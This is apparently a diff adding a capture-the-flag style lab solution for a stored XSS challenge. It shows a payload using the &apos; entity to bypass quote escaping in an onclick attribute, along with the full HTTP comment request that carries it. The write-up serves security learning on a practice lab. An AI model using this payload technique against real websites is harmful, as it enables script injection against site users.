@@ -1,0 +1,22 @@
+Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
+
+Make a comment on a blog and use http://pwned?&apos;-alert(1)-&apos; in the website field. Upon reload you should get the lab completed prompt.
+
+&apos is a HTML entity that acts like ' , allowing us to use ' even when they're escaped.
+
+Request:
+POST /post/comment HTTP/1.1
+Host: acfd1f4c1ecec43e807722d600900042.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 155
+Origin: https://acfd1f4c1ecec43e807722d600900042.web-security-academy.net
+Connection: close
+Referer: https://acfd1f4c1ecec43e807722d600900042.web-security-academy.net/post?postId=3
+Cookie: session=xUBYqSv3Ij8Dnaf1m6Pw0V0lCJYEbOta
+Upgrade-Insecure-Requests: 1
+
+csrf=MrisPhCR5BskApRFUUUOmpD7lY3iPfUx&postId=3&comment=asdf&name=asdf&email=asdf%40asdf.com&website=http%3A%2F%2Fpwned%3F%26apos%3B-alert%281%29-%26apos%3B
